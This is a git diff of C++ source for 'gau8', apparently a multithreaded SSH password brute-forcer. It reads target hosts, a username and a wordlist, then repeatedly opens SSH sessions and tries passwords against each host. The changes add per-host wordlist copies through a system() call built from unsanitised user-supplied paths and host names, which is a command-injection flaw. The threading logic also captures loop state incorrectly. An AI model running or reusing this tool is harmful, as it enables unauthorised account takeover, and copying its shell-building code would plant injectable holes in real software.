@@ -30,7 +30,8 @@ int main(int argc, char** argv)
 
     //User license
 
-    std::string wordlist;
+    std::string wordlist_path;
+    std::vector<std::ifstream*> wordlist_for_host;
     gau8::license lic;
     uint16_t port = 22, num_of_threads_per_host = 1, attempts_per_conn = 3;
     std::vector<std::string> hosts;
@@ -58,7 +59,7 @@ int main(int argc, char** argv)
             }
         }else if(!strcmp(argv[i], "-w") || !strcmp(argv[i], "--wordlist"))
         {
-            wordlist = argv[++i];
+            wordlist_path = argv[++i];
         }else if(!strcmp(argv[i], "-th") || !strcmp(argv[i], "--threads-per-host"))
         {
             num_of_threads_per_host = atoi(argv[++i]);
@@ -95,7 +96,7 @@ int main(int argc, char** argv)
     }
 
 //Check if all args are passed from the command line
-    if(!hosts.size() || user == nullptr || !wordlist.size() )
+    if(!hosts.size() || user == nullptr || !wordlist_path.size() )
     {
         std::cout << "USAGE: " << argv[0] << " + options \nOPTIONS: \n      -i/--host                    IP Address of one target\n      -iL/--hosts-file             File Containing targets\n      -u/--user                    Username\n      -w/--wordlist                Wordlist\n      -p/--port                    Port (Optional)\n      -th/--threads-per-host       Threads per host (Optional)\n      -a/--attempts-per-session    Password Attempts per SSH session" << std::endl;
         return LINNUX_COMMAND_ERR;
@@ -104,42 +105,41 @@ int main(int argc, char** argv)
 
     for(uint16_t host_index = 0; host_index < hosts.size(); ++host_index)
     {
+
+        system(std::string("cat " + wordlist_path + " > /tmp/gau8_tmp_wordlist_" + hosts[host_index]).c_str());
+        wordlist_for_host.push_back(new std::ifstream(std::string("/tmp/gau8_tmp_wordlist_" + hosts[host_index]).c_str()));
         for(uint16_t i = 1; i <= num_of_threads_per_host; i++)
         {
             //add all threads to the vector of threads 
             threads.push_back(new std::thread([&](){
-                static std::string host = hosts[host_index];
-                std::ifstream passwords(wordlist.c_str());
+                static uint16_t this_host_index = host_index;
                 char f_password[15];
                 while(true)
                 {
                     //basically create a new ssh connection and session, try [attempts_per_conn] passwords, then kill it
                     int handle;
-                    gau8::ssh* f_ssh = new gau8::ssh(host.c_str(), port, handle);
+                    gau8::ssh* f_ssh = new gau8::ssh(hosts[this_host_index].c_str(), port, handle);
                     while(handle)
                     {
                         //some ssh servers might refuse connections, so block the thread until 
                         delete f_ssh; 
-                        f_ssh = new gau8::ssh(host.c_str(), port, handle);
+                        f_ssh = new gau8::ssh(hosts[this_host_index].c_str(), port, handle);
                         std::this_thread::sleep_for(std::chrono::milliseconds(250));
                     }
                     for(uint16_t i = 1; i <= attempts_per_conn; i++)
-                    {
-try_lock:                       
+                    {         
                         if(m_lock_pass.try_lock())
                         {
                             //Lock the wordlist and read one password
-                            passwords >> f_password;
+                            *(wordlist_for_host[this_host_index]) >> f_password;
                             //raise the counter for the number of attempts
                             attempt_counter++;
                             m_lock_pass.unlock();
-                        }else{
-                            goto try_lock;
                         }
     
                         //try to authenticate via the username that the connection was created with and the password that was read above
                         
-                        std::string result_from_auth = "ATTEMPT: ";
+                        std::string result_from_auth = "HOST: " + hosts[this_host_index] + " ATTEMPT: ";
 
                         if(f_ssh->auth_user_pass(user, f_password))
                         {                
